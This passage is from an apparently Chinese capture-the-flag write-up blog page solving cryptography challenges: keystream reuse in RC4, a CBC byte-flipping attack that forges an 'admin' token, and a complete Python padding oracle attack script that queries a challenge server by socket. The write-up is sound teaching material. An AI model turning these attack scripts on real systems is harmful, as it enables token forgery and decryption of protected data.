class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(key)</span>:</span></span><br><span class="line">    subKeys = []</span><br><span class="line">    subKey = key</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">        subKey = HASH(subKey)</span><br><span class="line">        subKeys.append(subKey)</span><br><span class="line">    <span class="keyword">return</span> subKeys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes</span><span class="params">(key,data)</span>:</span></span><br><span class="line">    subKeys = key_schedule(key)</span><br><span class="line">    <span class="keyword">return</span> bes_encrypt(subKeys, data).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1fde6a7b2ff15d0a bad691215ca5d470</span></span><br><span class="line"><span class="comment"># the result  is "1fde6a7b2ff15d0abad691215ca5d470"</span></span><br><span class="line"><span class="comment"># if __name__ == "__main__":</span></span><br><span class="line"><span class="comment">#     bes('explorer','??flag_is_here??')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print key_schedule('explorer')</span></span><br><span class="line">bes_decrypt(d2,d1)</span><br></pre></td></tr></table></figure></p>
+<h3 id="进击的-Crypto-1"><a href="#进击的-Crypto-1" class="headerlink" title="进击的 Crypto [1]"></a>进击的 Crypto [1]</h3><blockquote>
+<p>题目描述： 让我们来玩点有趣的东西 :)<br><a href="http://119.29.138.57:23333/crypto/encode_system/" target="_blank" rel="external">http://119.29.138.57:23333/crypto/encode_system/</a></p>
+</blockquote>
+<p>题目思路来源于 HCTF 2014 中的 <a href="https://github.com/hduisa/hctf2015-all-problems/tree/master/server%20is%20done" target="_blank" rel="external">server is done</a> 题目<br>题目是采用的 RC4 算法来产生密钥流，然后对用户的输入进行加密，其中 flag 也被相同的密钥进行了加密，密文在源码中，有个小坑是 flag 的密文是没经任何处理直接输出的，包含的不可显字符就不能直接复制下来了，这里我是通过写了个 Python 脚本来获取的。</p>
+<p>因为我们不知道密钥是多少位的，直接传入很长的明文，这样我们有了明文1，密文1，密文2，就能知道明文2的内容了，贴上个以前写的 PHP 的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 明文、密文、密钥长度一样</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    流密码加密</span></span><br><span class="line"><span class="comment">    E(A) = A xor C</span></span><br><span class="line"><span class="comment">    E(B) = B xor C</span></span><br><span class="line"><span class="comment">    E(A) xor E(B) = (A xor C) xor (B xor C) = A xor B </span></span><br><span class="line"><span class="comment">    E(A) xor A = A xor C xor A = C</span></span><br><span class="line"><span class="comment">    E(B) xor C = B xor C xor C = B</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$message  = <span class="string">"3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131"</span>;</span><br><span class="line">$cipher   = <span class="string">"66706d04437b15455e4503464f50714d5e066a1d765873527340706b5e6d03556d1054064a01576660677d067451696a467154426c40146146475c62470e59641c1d4051720e0f187e026f4c411f0509767b5744656d4552746b7a66446d1558525c1f1863430f585a0264670c55045e72675d4d55714159715074474b511906"</span>;</span><br><span class="line">$message2 = <span class="string">""</span>;</span><br><span class="line">$cipher2  = <span class="string">"2f1433790f73490d1215180f354f2337560f22646b096326265d3d1b573a40311012321e281d1c3f75267d5211273e2b2928354d65150b15071d0417441530096a1c4e1e21067343206c39061c1f071e78180145183d03512f2d7a6b5007000c40597f483a1a5d1d0d48073f4b01001b1c155d0c0c250237743e74052505524a"</span>;</span><br><span class="line">$key      = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pack()函数 把一定格式的数据装入一个二进制字符串   H 16进制格式</span></span><br><span class="line"><span class="comment">// bin2hex()函数 把二进制字符串转换成16进制字符串</span></span><br><span class="line">$key = bin2hex(pack(<span class="string">'H*'</span>,$cipher) ^ pack(<span class="string">'H*'</span>,$message));</span><br><span class="line">$message2 = bin2hex(pack(<span class="string">'H*'</span>,$cipher2) ^ pack(<span class="string">'H*'</span>,$key));</span><br><span class="line"><span class="keyword">echo</span> $message2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="explorer的奇怪番外5"><a href="#explorer的奇怪番外5" class="headerlink" title="explorer的奇怪番外5"></a>explorer的奇怪番外5</h3><blockquote>
+<p>题目描述： <a href="http://121.42.25.113/crypto1/crypto1.html" target="_blank" rel="external">http://121.42.25.113/crypto1/crypto1.html</a></p>
+</blockquote>
+<p>cbc byte flipping attack(cbc 字节翻转攻击)，核心是利用异或<br>题目要求输入一段 token，aes 解密后明文是 <code>admin:alvndasjnc</code>。提供了注册功能，但是不能直接输入明文，如果我们改变明文的第一个字母为 b，通过下面的异或操作就能得到原明文对应的 token，假设中间值为 mid，a 对应的密文部分为 aa，b 对应的密文部分为 bb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;b&apos; xor mid = bb</span><br><span class="line">&apos;b&apos; xor mid xor &apos;b&apos; xor &apos;a&apos; = aa</span><br></pre></td></tr></table></figure></p>
+<p>对于这道题来说则是，注册 <code>bdmin:alvndasjnc</code>，得到 token 值 <font color="red">8e</font>b9e846f62c5036a8bfa2bd3f6ff9c65d7b15e6eb0494081a7f1c74e9cc4e37a7585b5a9d17d775291595adaa12701c，更改 IV 的首字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x8e xor 0x62 xor 0x61 = 0x8d</span><br></pre></td></tr></table></figure></p>
+<p>提交 <font color="red">8d</font>b9e846f62c5036a8bfa2bd3f6ff9c65d7b15e6eb0494081a7f1c74e9cc4e37a7585b5a9d17d775291595adaa12701c，得到 flag</p>
+<h3 id="explorer的奇怪番外6"><a href="#explorer的奇怪番外6" class="headerlink" title="explorer的奇怪番外6"></a>explorer的奇怪番外6</h3><blockquote>
+<p>题目描述： <a href="http://121.42.25.113/crypto2/crypto2.html" target="_blank" rel="external">http://121.42.25.113/crypto2/crypto2.html</a></p>
+</blockquote>
+<p>题目已经说了是 padding oracle attack，网上关于这种攻击的资料很多，原理不再叙述</p>
+<p>因为网上大多是 Web 应用中的已知密文的攻击，而这道题是已知明文的攻击。不过大同小异。</p>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/HCTF_GAME_week3_wp_1.png" alt="HCTF_GAME_week3_wp_1.png"><br>如果我们先随便选取一段密文，根据这种攻击的思想跑出相应的 IV，但是问题在于此时的明文不一定是我们想要的。我们知道 AES 解密后的中间值(即上图中的 Intermidiary Value)是不变的，对于同一段密文和 key 来说。假设我们之前跑出来的明文及 IV 分别为 m1、IV1，要求的明文及 IV 为 m2、IV2<br>\begin{matrix} m1\ xor\ IV1 = Intermidiary\ Value \\<br>m2\ xor\ IV2 = Intermidiary\ Value \\<br>IV2 = Intermidiary\ Value\ xor\ m2 \end{matrix}<br>也就是说我们用跑出来的 Intermidiary Value 和 想要的明文进行异或，就得得到符合要求的 IV，然后我们从最后一组 token 往前跑，因为这样就可以异或得到的 IV 作为前一组的密文</p>
+<p>脚本写的复杂了些，不过应该比较好理解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">host = <span class="string">'121.42.25.113'</span></span><br><span class="line">port = <span class="number">20003</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect((host,port))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">'admin:alvndasjnc'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = <span class="string">'akslbdvlaksdn'</span>.encode(<span class="string">'hex'</span>) + <span class="string">'03'</span> * <span class="number">3</span></span><br><span class="line">intermediary = list(<span class="string">'-'</span> * <span class="number">32</span>)</span><br><span class="line">IV = <span class="string">'0'</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(IV, c)</span>:</span></span><br><span class="line">    IV = <span class="string">''</span>.join(IV)</span><br><span class="line">    sk.sendall(<span class="string">'1\n'</span>)</span><br><span class="line">    sk.recv(<span class="number">1024</span>)</span><br><span class="line">    sk.sendall(IV + c + <span class="string">'\n'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> mes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeIV</span><span class="params">(IV, num)</span>:</span></span><br><span class="line">    tmp = (<span class="number">32</span> - num)/<span class="number">2</span></span><br><span class="line">    nextPad = tmp + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> str(num + <span class="number">1</span>).zfill(<span class="number">2</span>) + <span class="string">'-'</span> + str(num + <span class="number">2</span>).zfill(<span class="number">2</span>) + <span class="string">': '</span>,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,tmp + <span class="number">1</span>):</span><br><span class="line">        tmp2 = <span class="number">32</span> - <span class="number">2</span> * i</span><br><span class="line">        IV[tmp2:tmp2+<span class="number">2</span>] = hex(int(<span class="string">''</span>.join(IV[tmp2:tmp2+<span class="number">2</span>]),<span class="number">16</span>) ^ tmp ^ nextPad)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(IV)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeMessageIV</span><span class="params">(IV, m)</span>:</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">        IV[i:i+<span class="number">2</span>] = hex(int(<span class="string">''</span>.join(IV[i:i+<span class="number">2</span>]),<span class="number">16</span>) ^ <span class="number">17</span> ^ int(<span class="string">''</span>.join(m[i:i+<span class="number">2</span>]),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(IV)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(m, c)</span>:</span></span><br><span class="line">    IV = <span class="string">'0'</span> * <span class="number">32</span>   </span><br><span class="line">    num = <span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> changeMessageIV(list(IV), list(m))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            h = hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">            IV = list(IV)</span><br><span class="line">            IV[num:num+<span class="number">2</span>] = h</span><br><span class="line">            res = sendData(IV, c)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'decrypt error'</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                IV = changeIV(IV, num)</span><br><span class="line">                <span class="keyword">print</span> IV</span><br><span class="line">                num -= <span class="number">2</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    c = <span class="string">'0'</span> * <span class="number">32</span></span><br><span class="line">    token2 = run(msg2,c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'The token 2 is '</span> + token2</span><br><span class="line">    c = token2</span><br><span class="line">    token1 = run(msg1,c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'The token 1 is '</span> + token1</span><br><span class="line">    <span class="keyword">print</span> sendData(token1,token2 + <span class="string">'0'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
